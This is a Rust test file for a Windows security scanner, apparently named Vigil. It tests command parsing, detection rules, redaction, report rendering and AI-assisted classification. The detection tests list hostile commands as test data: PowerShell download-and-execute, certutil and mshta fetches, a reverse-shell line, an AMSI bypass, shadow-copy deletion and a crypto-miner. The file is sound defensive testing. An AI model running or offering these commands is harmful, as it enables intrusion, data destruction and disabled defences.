//! Tests of the scan engine, plus its exact output on two fictitious inventories (reference reports).
//!
//! No test changes the system or calls external services.

mod support;

use std::collections::BTreeSet;
use std::sync::{Arc, Mutex};

use base64::Engine as _;
use serde_json::{Value, json};
use support::*;
use vigil_scan::ai::{self, AiError, Provider};
use vigil_scan::cmdline::{normalize_path, parse_command};
use vigil_scan::model::{Analysis, Flag, Item};
use vigil_scan::privacy::{Redactor, scrub_secrets};
use vigil_scan::remedy::ps_quote;
use vigil_scan::rules::{location_flags, name_flags, scan_command};
use vigil_scan::{pipeline, report, run_analysis};

fn codes(flags: &[Flag]) -> BTreeSet<String> {
    flags.iter().map(|f| f.code.clone()).collect()
}

fn has(flags: &[Flag], code: &str) -> bool {
    flags.iter().any(|f| f.code == code)
}

fn scan(text: &str) -> Vec<Flag> {
    scan_command(&[Some(text)])
}

fn encode(script: &str) -> String {
    let bytes: Vec<u8> = script.encode_utf16().flat_map(u16::to_le_bytes).collect();
    base64::engine::general_purpose::STANDARD.encode(bytes)
}

// --------------------------------------------------------------------------- reference output

/// The first line where two texts differ (for a readable failure).
fn first_difference(ours: &str, theirs: &str) -> String {
    for (n, (a, b)) in ours.lines().zip(theirs.lines()).enumerate() {
        if a != b {
            return format!("line {}:\n  got:      {a}\n  expected: {b}", n + 1);
        }
    }
    format!(
        "lengths differ: got {} lines, expected {} lines",
        ours.lines().count(),
        theirs.lines().count()
    )
}

#[test]
fn analysis_matches_the_reference_exactly() {
    let analysis = run_analysis(&fixture(), false);
    let ours = report::render_json(&analysis);
    let theirs = data("fixture-analysis.json");
    assert!(
        ours == theirs,
        "render_json differs from the reference: {}",
        first_difference(&ours, &theirs)
    );
}

#[test]
fn items_ids_verdicts_and_scores_match_the_reference() {
    let analysis = run_analysis(&fixture(), false);
    let golden: Value = serde_json::from_str(&data("fixture-analysis.json")).expect("golden");
    let theirs = golden["items"].as_array().expect("items");
    assert_eq!(analysis.items.len(), theirs.len());
    for (ours, theirs) in analysis.items.iter().zip(theirs) {
        assert_eq!(ours.id, theirs["id"], "{}", ours.title);
        assert_eq!(ours.verdict, theirs["verdict"], "{}", ours.id);
        assert_eq!(ours.level(), theirs["level"], "{}", ours.id);
        assert_eq!(json!(ours.score), theirs["score"], "{}", ours.id);
        let flags: Vec<Value> = ours.flags.iter().map(Flag::to_value).collect();
        assert_eq!(Value::Array(flags), theirs["flags"], "{}", ours.id);
    }
    let ours = analysis.to_value();
    for key in ["stats", "posture", "notes", "meta"] {
        assert_eq!(ours[key], golden[key], "{key}");
    }
}

/// The %SystemRoot% the golden data was generated with, replaced by this machine's.
fn localize(text: &str) -> String {
    let helpers: Value = serde_json::from_str(&data("helpers.json")).expect("helpers");
    let theirs = helpers["windir"].as_str().unwrap_or(r"C:\Windows").to_string();
    let ours = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
    if theirs == ours {
        return text.to_string();
    }
    let escaped = |path: &str| path.replace('\\', "\\\\");
    text.replace(&escaped(&theirs), &escaped(&ours)).replace(&theirs, &ours)
}

#[test]
fn rich_inventory_matches_the_reference_exactly() {
    let raw: Value = serde_json::from_str(&data("rich.json")).expect("rich");
    let analysis = run_analysis(&raw, false);
    let ours = report::render_json(&analysis);
    let theirs = localize(&data("rich-analysis.json"));
    assert!(
        ours == theirs,
        "render_json differs from the reference: {}",
        first_difference(&ours, &theirs)
    );
    let page = report::render_html(&analysis);
    let ours = page.split("<footer>").next().unwrap_or("");
    let theirs = localize(&data("rich-report-body.html"));
    assert!(
        ours == theirs,
        "render_html differs from the reference: {}",
        first_difference(ours, &theirs)
    );
}

#[test]
fn ai_payloads_match_the_reference() {
    for (raw, golden) in [
        (&data("fixture.json"), &data("fixture-payloads.json")),
        (&data("rich.json"), &data("rich-payloads.json")),
    ] {
        let analysis = run_analysis(&serde_json::from_str(raw).expect("raw"), false);
        let ours: Vec<Value> = analysis
            .items
            .iter()
            .filter(|i| !i.trusted)
            .map(ai::item_payload)
            .collect();
        let theirs: Value = serde_json::from_str(&localize(golden)).expect("golden");
        let ours = serde_json::to_string_pretty(&ours).expect("json");
        let theirs = serde_json::to_string_pretty(&theirs).expect("json");
        assert!(
            ours == theirs,
            "item_payload differs: {}",
            first_difference(&ours, &theirs)
        );
    }
}

#[test]
fn html_report_matches_the_reference() {
    let analysis = run_analysis(&fixture(), false);
    let page = report::render_html(&analysis);
    let ours = page.split("<footer>").next().unwrap_or("");
    let theirs = data("fixture-report-body.html");
    assert!(
        ours == theirs,
        "render_html differs from the reference: {}",
        first_difference(ours, &theirs)
    );
}

#[test]
fn html_report_follows_the_language() {
    let page = |lang: &str| vigil_i18n::with_language(lang, || report::render_html(&run_analysis(&fixture(), false)));
    let spanish = page("es");
    for heading in [
        "<html lang=\"es\">",
        "<h1>Vigil — informe del examen de seguridad</h1>",
        "<h2>Estado de seguridad del sistema</h2>",
        "Siguientes pasos recomendados",
        "Buscar por nombre, ruta o id.",
    ] {
        assert!(spanish.contains(heading), "Spanish report lacks {heading:?}");
    }
    let chinese = page("zh");
    for heading in [
        "<html lang=\"zh-CN\">",
        "<h1>Vigil — 安全扫描报告</h1>",
        "<h2>系统安全状况</h2>",
        "建议的后续步骤",
        "按名称、路径或 ID 搜索",
    ] {
        assert!(chinese.contains(heading), "Chinese report lacks {heading:?}");
    }
    // Verdicts stay machine-readable: only their labels change.
    assert!(chinese.contains("data-verdict=\"review\""));
    assert!(!chinese.contains("System security posture"));
}

// --------------------------------------------------------------------------- command lines

#[test]
fn quoted_program_with_arguments() {
    let parsed = parse_command(r#""C:\Program Files\Foo\foo.exe" --bar baz"#, None);
    assert_eq!(parsed.program.as_deref(), Some(r"C:\Program Files\Foo\foo.exe"));
    assert_eq!(parsed.args, "--bar baz");
    assert!(parsed.host.is_none());
    assert_eq!(parsed.target(), parsed.program.as_deref());
}

#[test]
fn unquoted_path_with_spaces_resolves_to_existing_file() {
    let tmp = TempDir::new("spaces");
    let folder = tmp.0.join("My App");
    std::fs::create_dir_all(&folder).expect("folder");
    let exe = folder.join("tool.exe");
    std::fs::write(&exe, b"").expect("file");
    let exe = exe.display().to_string();
    let parsed = parse_command(&format!("{exe} --silent"), None);
    assert_eq!(
        parsed.program.as_deref().map(str::to_lowercase),
        Some(exe.to_lowercase())
    );
    assert_eq!(parsed.args, "--silent");
    assert!(parsed.certain);
}

#[test]
fn missing_unquoted_path_is_cut_at_extension() {
    let parsed = parse_command(r"C:\Program Files\Gone App\gone.exe /silent", None);
    assert_eq!(parsed.program.as_deref(), Some(r"C:\Program Files\Gone App\gone.exe"));
    assert_eq!(parsed.args, "/silent");
    assert!(!parsed.certain);
}

#[test]
fn rundll32_payload_is_the_dll() {
    let parsed = parse_command("rundll32.exe shell32.dll,Control_RunDLL", None);
    assert_eq!(parsed.host.as_deref(), Some("rundll32.exe"));
    assert_eq!(
        parsed.payload.map(|p| p.to_lowercase()),
        Some(format!(r"{}\shell32.dll", system32()).to_lowercase())
    );
    let parsed = parse_command(r#"rundll32 "C:\Users\x\AppData\Roaming\evil.dll",Start"#, None);
    assert_eq!(parsed.payload.as_deref(), Some(r"C:\Users\x\AppData\Roaming\evil.dll"));
    let parsed = parse_command(r"rundll32.exe C:\Program Files\Thing\a b.dll,Entry", None);
    assert_eq!(parsed.payload.as_deref(), Some(r"C:\Program Files\Thing\a b.dll"));
}

#[test]
fn encoded_powershell_is_decoded() {
    let script = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a')";
    let encoded = encode(script);
    for switch in ["-Enc", "-e", "-EncodedCommand", "-ec"] {
        let parsed = parse_command(&format!("powershell.exe -NoP -W Hidden {switch} {encoded}"), None);
        assert_eq!(parsed.decoded.as_deref(), Some(script), "{switch}");
        assert!(parsed.hidden);
        assert!(parsed.payload.is_none());
    }
}

#[test]
fn powershell_file_and_execution_policy() {
    let parsed = parse_command(
        r#"powershell -ExecutionPolicy Bypass -File "C:\Scripts\job.ps1" -Arg 1"#,
        None,
    );
    assert_eq!(parsed.payload.as_deref(), Some(r"C:\Scripts\job.ps1"));
    assert!(!parsed.hidden);
}

#[test]
fn cmd_start_reaches_the_real_program() {
    let parsed = parse_command(r#"cmd.exe /c start /min "" "C:\ProgramData\x\run.bat""#, None);
    assert_eq!(parsed.host.as_deref(), Some("cmd.exe"));
    assert_eq!(parsed.payload.as_deref(), Some(r"C:\ProgramData\x\run.bat"));
    assert!(!parsed.compound);
}

#[test]
fn cmd_compound_command_is_flagged() {
    let parsed = parse_command(
        r"%windir%\system32\cmd.exe /c ping -n 1 1.1.1.1 & C:\Temp\evil.exe",
        None,
    );
    assert!(parsed.compound);
}

#[test]
fn script_hosts() {
    let parsed = parse_command(r#"wscript.exe //B //Nologo "C:\Users\Public\a.vbs""#, None);
    assert_eq!(parsed.payload.as_deref(), Some(r"C:\Users\Public\a.vbs"));
    let parsed = parse_command("mshta.exe javascript:alert(1)", None);
    assert!(parsed.payload.is_none());
    let parsed = parse_command("mshta http://203.0.113.7/x.hta", None);
    assert_eq!(parsed.payload_url.as_deref(), Some("http://203.0.113.7/x.hta"));
}

#[test]
fn interpreters_and_installers() {
    assert_eq!(
        parse_command(r#""C:\Py\python.exe" C:\jobs\task.py --x"#, None)
            .payload
            .as_deref(),
        Some(r"C:\jobs\task.py")
    );
    assert!(
        parse_command(r#""C:\Py\python.exe" -m http.server"#, None)
            .payload
            .is_none()
    );
    assert_eq!(
        parse_command(r#"msiexec /i "C:\x\y.msi" /qn"#, None).payload.as_deref(),
        Some(r"C:\x\y.msi")
    );
    assert_eq!(
        parse_command(r"java -Xmx1g -jar C:\apps\a.jar", None)
            .payload
            .as_deref(),
        Some(r"C:\apps\a.jar")
    );
}

#[test]
fn regsvr32_scriptlet() {
    let parsed = parse_command("regsvr32 /s /n /u /i:http://203.0.113.7/x.sct scrobj.dll", None);
    assert_eq!(
        parsed.payload.map(|p| p.to_lowercase()),
        Some(format!(r"{}\scrobj.dll", system32()).to_lowercase())
    );
}

#[test]
fn normalize_driver_paths() {
    let windir = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".into());
    assert_eq!(
        normalize_path(r"\SystemRoot\System32\drivers\foo.sys").to_lowercase(),
        format!(r"{windir}\System32\drivers\foo.sys").to_lowercase()
    );
    assert_eq!(normalize_path(r"\??\C:\Windows\x.sys"), r"C:\Windows\x.sys");
}

// --------------------------------------------------------------------------- rules

#[test]
fn command_patterns() {
    let cases = [
        (
            "xmrig.exe -o stratum+tcp://pool.minexmr.com:4444 --donate-level 1",
            "miner",
        ),
        ("vssadmin.exe delete shadows /all /quiet", "anti_recovery"),
        (
            r"powershell Add-MpPreference -ExclusionPath C:\Users",
            "disables_defenses",
        ),
        (
            "regsvr32 /s /i:http://203.0.113.7/a.sct scrobj.dll",
            "regsvr32_scriptlet",
        ),
        ("mshta http://203.0.113.7/a.hta", "remote_mshta"),
        (
            "certutil -urlcache -split -f http://203.0.113.7/a.exe a.exe",
            "certutil_download",
        ),
        ("net user hacker P@ssw0rd /add", "creates_account"),
        (
            r#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ""#,
            "rundll32_proxy",
        ),
        (
            "$c=New-Object System.Net.Sockets.TCPClient('203.0.113.7',443)",
            "reverse_shell",
        ),
        (
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
            "amsi_bypass",
        ),
    ];
    for (command, expected) in cases {
        assert!(has(&scan(command), expected), "{command}");
    }
}

#[test]
fn benign_commands_have_no_signals() {
    for command in [
        r"C:\Windows\System32\svchost.exe -k netsvcs -p",
        r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer"#,
        "cmd.exe /d /s /c vite",
        r#""C:\Program Files\Docker\Docker\Docker Desktop.exe""#,
    ] {
        assert!(scan(command).is_empty(), "{command}");
    }
}

#[test]
fn system_name_outside_windows() {
    assert!(has(
        &name_flags(r"C:\Users\x\AppData\Roaming\svchost.exe", false, false),
        "system_impersonation"
    ));
    assert!(name_flags(&format!(r"{}\svchost.exe", system32()), true, false).is_empty());
}

#[test]
fn lookalike_names() {
    for name in [
        "svch0st.exe",
        "scvhost.exe",
        "lsasss.exe",
        "exp1orer.exe",
        "explore.exe",
    ] {
        assert!(
            has(
                &name_flags(&format!(r"C:\Apps\{name}"), false, false),
                "system_lookalike_name"
            ),
            "{name}"
        );
    }
    for name in ["service.exe", "host.exe", "chromedriver.exe", "explorer++.exe"] {
        assert!(
            !has(
                &name_flags(&format!(r"C:\Apps\{name}"), false, false),
                "system_lookalike_name"
            ),
            "{name}"
        );
    }
}

#[test]
fn double_extension() {
    assert!(has(
        &name_flags(r"C:\Users\x\Downloads\invoice.pdf.exe", false, false),
        "double_extension"
    ));
}

#[test]
fn locations() {
    assert!(has(
        &location_flags(r"C:\Users\x\AppData\Local\Temp\a.exe"),
        "path_temp"
    ));
    assert!(has(
        &location_flags(r"C:\Users\x\AppData\Roaming\a.exe"),
        "path_appdata_root"
    ));
    assert!(has(
        &location_flags(r"C:\$Recycle.Bin\S-1-5-21\a.exe"),
        "path_recycle_bin"
    ));
    assert!(location_flags(r"C:\Program Files\Foo\foo.exe").is_empty());
}

// --------------------------------------------------------------------------- privacy

#[test]
fn secrets_are_hidden() {
    let text = scrub_secrets("tool.exe --password hunter2 --token=abc123 https://bob:s3cret@host/x api_key=XYZ");
    for secret in ["hunter2", "abc123", "s3cret", "XYZ"] {
        assert!(!text.contains(secret), "{secret}: {text}");
    }
    assert!(text.contains("tool.exe"));
}

#[test]
fn redactor_replaces_identity() {
    let redactor = Redactor::new("jdoe", "DESKTOP-ABC123", true);
    let out = redactor.apply(&json!({
        "path": r"C:\Users\jdoe\app.exe", "account": "DESKTOP-ABC123\\jdoe",
        "sid": "S-1-5-21-111-222-333-1001", "other": ["Johnson"],
    }));
    assert_eq!(out["path"], r"C:\Users\<user>\app.exe");
    assert_eq!(out["account"], "<computer>\\<user>");
    assert_eq!(out["sid"], "S-1-5-21-<sid>-1001");
    assert_eq!(out["other"], json!(["Johnson"]));
}

#[test]
fn redactor_can_be_disabled() {
    assert_eq!(
        Redactor::new("jdoe", "PC", false).text(r"C:\Users\jdoe"),
        r"C:\Users\jdoe"
    );
}

#[test]
fn powershell_quoting_cannot_be_escaped() {
    assert_eq!(
        ps_quote(Some(r"Task'; Remove-Item C:\ -Recurse; '")).as_deref(),
        Some(r"'Task''; Remove-Item C:\ -Recurse; '''")
    );
    assert_eq!(ps_quote(Some("a\u{2019}b")).as_deref(), Some("'a''b'"));
    assert_eq!(ps_quote(Some("line1\nline2")), None);
    assert_eq!(ps_quote(Some("")), None);
}

// --------------------------------------------------------------------------- detection

fn analysis() -> Analysis {
    run_analysis(&fixture(), false)
}

fn by_path<'a>(analysis: &'a Analysis, path: &str) -> &'a Item {
    analysis
        .items
        .iter()
        .find(|i| i.path.as_deref().map(str::to_lowercase) == Some(path.to_lowercase()))
        .unwrap_or_else(|| panic!("no item for {path}"))
}

fn find<'a>(analysis: &'a Analysis, text: &str) -> &'a Item {
    let needle = text.to_lowercase();
    analysis
        .items
        .iter()
        .find(|i| {
            format!("{} {}", i.title, i.commands.join(" "))
                .to_lowercase()
                .contains(&needle)
        })
        .unwrap_or_else(|| panic!("no item contains \"{text}\""))
}

fn strings(value: &Value) -> Vec<String> {
    value
        .as_array()
        .map(|a| a.iter().filter_map(|v| v.as_str().map(str::to_string)).collect())
        .unwrap_or_default()
}

#[test]
fn fake_svchost_is_critical() {
    let analysis = analysis();
    let item = by_path(&analysis, FAKE_SVCHOST);
    assert!(has(&item.flags, "system_impersonation"));
    assert_eq!(item.level(), "critical");
    assert!(!item.trusted);
    assert!(strings(&item.network["exposed"]).contains(&"tcp 0.0.0.0:4444".to_string()));
    assert!(strings(&item.network["remote"]).contains(&"8.8.8.8:443".to_string()));
}

#[test]
fn real_svchost_is_trusted() {
    let analysis = analysis();
    let trusted: Vec<&Item> = analysis
        .items
        .iter()
        .filter(|i| {
            i.trusted
                && format!("{}{}", i.title, i.path.as_deref().unwrap_or(""))
                    .to_lowercase()
                    .contains("svchost")
        })
        .collect();
    assert!(!trusted.is_empty());
    assert!(trusted.iter().all(|i| i.verdict == "trusted"));
}

#[test]
fn encoded_hidden_powershell_autorun() {
    let analysis = analysis();
    let item = find(&analysis, "-Enc");
    assert_eq!(item.kind, "command");
    let expected: BTreeSet<String> = [
        "encoded_powershell",
        "hidden_window",
        "network_download",
        "executes_text",
        "ip_url",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    assert!(expected.is_subset(&codes(&item.flags)));
    assert_eq!(item.level(), "critical");
    assert!(item.decoded[0].contains("DownloadString"));
    assert!(
        item.remediation
            .iter()
            .any(|s| s["command"].as_str().unwrap_or("").contains("Remove-ItemProperty"))
    );
}

#[test]
fn miner_task() {
    let analysis = analysis();
    let item = by_path(&analysis, MINER);
    for code in ["miner", "hidden_task", "elevated_task_user_path", "defender_excluded"] {
        assert!(has(&item.flags, code), "{code}");
    }
    assert_eq!(item.level(), "critical");
    assert!(
        item.remediation
            .iter()
            .any(|s| s["command"].as_str().unwrap_or("").contains("Disable-ScheduledTask"))
    );
}

#[test]
fn system_service_in_temp() {
    let analysis = analysis();
    let item = by_path(&analysis, TEMP_SERVICE);
    for code in ["path_temp", "unsigned", "system_service_user_path"] {
        assert!(has(&item.flags, code), "{code}");
    }
}

#[test]
fn winlogon_userinit_extra_program() {
    let analysis = analysis();
    assert!(has(&by_path(&analysis, HELPER).flags, "winlogon_modified"));
}

#[test]
fn signed_third_party_app_is_not_alarming() {
    let analysis = analysis();
    let item = by_path(&analysis, LEGIT_APP);
    assert_eq!(item.score, 0);
    assert!(!item.trusted);
}

#[test]
fn programs_extensions_and_configuration() {
    let analysis = analysis();
    assert!(has(&find(&analysis, "KMSpico").flags, "piracy_activator"));
    let extension = find(&analysis, "Search Helper");
    for code in ["forced_extension", "all_sites_access", "high_risk_permissions"] {
        assert!(has(&extension.flags, code), "{code}");
    }
    let topics: BTreeSet<String> = analysis
        .items
        .iter()
        .filter(|i| i.kind == "config")
        .filter_map(|i| i.facts.get("topic")?.as_str().map(str::to_string))
        .collect();
    for expected in [
        "defender_off",
        "outdated_signatures",
        "defender_exclusions",
        "firewall_disabled",
        "uac_disabled",
        "rdp_enabled",
        "hosts",
        "additional_accounts",
        "other_administrators",
        "mining_domain",
    ] {
        assert!(topics.contains(expected), "{expected}");
    }
    assert!(has(&find(&analysis, "Event logs cleared").flags, "event_log_cleared"));
}

#[test]
fn report_escapes_untrusted_text() {
    let mut raw = fixture();
    raw["programs"].as_array_mut().expect("programs").push(json!({
        "name": "<script>alert(\"x\")</script>", "publisher": "<img src=x onerror=1>",
        "version": "1", "installed": null, "hidden": false,
    }));
    let page = report::render_html(&run_analysis(&raw, false));
    assert!(!page.contains("<script>alert(\"x\")</script>"));
    assert!(!page.contains("<img src=x"));
    assert!(page.contains("&lt;script&gt;alert"));
}

#[test]
fn saved_report_can_be_rendered_again() {
    let analysis = analysis();
    let restored = Analysis::from_value(&serde_json::from_str(&report::render_json(&analysis)).expect("json"));
    assert_eq!(restored.items.len(), analysis.items.len());
    assert_eq!(restored.items[0].flags, analysis.items[0].flags);
    let body = |a: &Analysis| {
        report::render_html(a)
            .split("<footer>")
            .next()
            .unwrap_or("")
            .to_string()
    };
    assert_eq!(body(&restored), body(&analysis));
}

// --------------------------------------------------------------------------- saved reports

#[test]
fn saved_report_round_trips() {
    let tmp = TempDir::new("report");
    let path = tmp.0.join("scan-20260101-100000-report.json");
    std::fs::write(&path, data("fixture-analysis.json")).expect("write");
    let loaded = pipeline::load_report(&path).expect("a saved report opens");
    assert_eq!(report::render_json(&loaded), data("fixture-analysis.json"));

    let base = pipeline::scan_base(&tmp.0.join("reports"));
    let (json_path, html_path) = pipeline::save_report(&loaded, &base, true).expect("save");
    assert!(json_path.display().to_string().ends_with("-report.json"));
    let html_path = html_path.expect("html written");
    assert!(
        std::fs::read_to_string(html_path)
            .expect("html")
            .starts_with("<!doctype html>")
    );
    let again = pipeline::load_report(&json_path).expect("reload");
    assert_eq!(again.items.len(), loaded.items.len());
    let ranks: Vec<usize> = again
        .items
        .iter()
        .map(|i| vigil_scan::model::verdict_rank(&i.verdict))
        .collect();
    assert!(ranks.windows(2).all(|w| w[0] <= w[1]), "saved in report order");
}

#[test]
fn reports_with_unknown_verdicts_and_other_files_are_refused() {
    let tmp = TempDir::new("bad");
    let odd = tmp.0.join("odd-report.json");
    std::fs::write(
        &odd,
        r#"{"meta": {}, "items": [{"kind": "program", "title": "x", "verdict": "eliminar"}]}"#,
    )
    .expect("write");
    let error = pipeline::load_report(&odd).expect_err("refused").to_string();
    assert!(error.contains("unknown verdict"), "{error}");
    let other = tmp.0.join("other.json");
    std::fs::write(&other, r#"{"hello": 1}"#).expect("write");
    assert_eq!(
        pipeline::load_report(&other).expect_err("refused").to_string(),
        "not a Vigil report"
    );
    std::fs::write(&other, "[1, 2]").expect("write");
    assert_eq!(
        pipeline::load_report(&other).expect_err("refused").to_string(),
        "not a Vigil report"
    );
}

// --------------------------------------------------------------------------- AI

/// Fake provider: answers "safe" to everything, like a manipulated model would.
struct Fake {
    provider: Provider,
    requests: Arc<Mutex<Vec<String>>>,
}

fn fake(drop: &[String]) -> Fake {
    let requests = Arc::new(Mutex::new(Vec::new()));
    let log = Arc::clone(&requests);
    let drop = Arc::new(Mutex::new(drop.to_vec()));
    let complete = move |_system: &str, user: &str, schema: &Value| -> Result<Value, AiError> {
        log.lock().expect("log").push(user.to_string());
        if *schema == ai::summary_schema() {
            return Ok(
                json!({"risk_level": "high", "headline": "t", "summary": "r", "priority_actions": [], "good_practices": []}),
            );
        }
        let payload: Value = serde_json::from_str(user.split_once("\n\n").expect("payload").1).expect("json");
        let mut dropped = drop.lock().expect("drop");
        let ids: Vec<Value> = payload["elements"]
            .as_array()
            .expect("elements")
            .iter()
            .filter(|e| !dropped.iter().any(|d| e["id"] == d.as_str()))
            .map(|e| json!({"id": e["id"], "what": "claims to be safe"}))
            .collect();
        dropped.clear(); // the retry answers every item
        Ok(json!({"findings": [], "safe_ids": ids}))
    };
    Fake {
        provider: Provider::custom("test", "test-model", "test provider", Box::new(complete)),
        requests,
    }
}

fn redactor() -> Redactor {
    Redactor::new("victim", "PC-VICTIM", true)
}

#[test]
fn critical_items_cannot_be_downgraded_to_safe() {
    let mut analysis = analysis();
    let fake = fake(&[]);
    let result = ai::classify(&mut analysis, &fake.provider, &redactor(), 10, 2, &|_| {});
    assert_eq!(result.with_verdict, result.sent);
    let critical: Vec<&Item> = analysis.items.iter().filter(|i| i.level() == "critical").collect();
    assert!(critical.len() >= 3);
    assert!(critical.iter().all(|i| i.verdict == "review"));
    assert!(
        analysis
            .items
            .iter()
            .filter(|i| !i.trusted && i.level() != "critical")
            .all(|i| i.verdict == "safe")
    );
}

#[test]
fn missing_ids_are_retried() {
    let mut analysis = analysis();
    let pending: Vec<String> = analysis
        .items
        .iter()
        .filter(|i| !i.trusted)
        .map(|i| i.id.clone())
        .collect();
    let fake = fake(&pending[..2]);
    let result = ai::classify(&mut analysis, &fake.provider, &redactor(), 100, 1, &|_| {});
    assert_eq!(result.with_verdict, pending.len());
    let requests = fake.requests.lock().expect("requests");
    // One request per batch, plus the retry with the two that were missing.
    assert_eq!(requests.len(), result.batches + 1);
    let retry: Value = serde_json::from_str(requests[1].split_once("\n\n").expect("payload").1).expect("json");
    assert_eq!(retry["elements"].as_array().map(Vec::len), Some(2));
}

#[test]
fn payload_is_anonymized_and_trusted_items_are_not_sent() {
    let mut analysis = analysis();
    let fake = fake(&[]);
    ai::classify(&mut analysis, &fake.provider, &redactor(), 100, 1, &|_| {});
    let sent = fake.requests.lock().expect("requests").join("\n");
    assert!(!sent.to_lowercase().contains("victim"));
    assert!(!sent.contains("PC-VICTIM"));
    assert!(sent.contains("<user>"));
    assert!(!sent.contains(&REAL_SVCHOST.replace('\\', "\\\\")));
    let (summary, _) = ai::summarize(&analysis, &fake.provider, &redactor()).expect("summary");
    assert_eq!(summary["risk_level"], "high");
}

#[test]
fn provider_errors_keep_local_verdicts() {
    let mut analysis = analysis();
    let broken = Provider::custom(
        "test",
        "test-model",
        "test provider",
        Box::new(|_, _, _| Err(AiError::Failed("no connection".into()))),
    );
    let result = ai::classify(&mut analysis, &broken, &redactor(), 45, 3, &|_| {});
    assert_eq!(result.with_verdict, 0);
    assert_eq!(result.errors, vec!["no connection".to_string()]);
    assert!(analysis.items.iter().all(|i| i.verdict_source != "ai"));
}

#[test]
fn ai_analyze_fills_the_report_and_logs_what_was_sent() {
    let mut analysis = analysis();
    let fake = fake(&[]);
    let tmp = TempDir::new("sent");
    let log = tmp.0.join("sent.json");
    ai::ai_analyze(&mut analysis, &fake.provider, true, &|_| {}, Some(&log)).expect("ai");
    assert_eq!(analysis.ai["provider"], "test");
    assert_eq!(analysis.ai["anonymized"], true);
    assert_eq!(
        analysis.summary.as_ref().map(|s| s["headline"].clone()),
        Some(json!("t"))
    );
    let written: Value = serde_json::from_str(&std::fs::read_to_string(&log).expect("log")).expect("json");
    assert!(written["batches"].as_array().is_some_and(|b| !b.is_empty()));
    assert!(!written.to_string().to_lowercase().contains("victim"));
    let page = report::render_html(&analysis);
    assert!(page.contains("High risk"));
}

#[test]
fn item_payload_is_compact() {
    let analysis = analysis();
    let item = by_path(&analysis, FAKE_SVCHOST);
    let payload = ai::item_payload(item);
    assert_eq!(payload["type"], "executable");
    assert_eq!(payload["signature"], "unsigned");
    assert!(payload["signals"].as_array().is_some_and(|s| !s.is_empty()));
    assert!(payload.get("decoded").is_none(), "empty fields are left out");
}
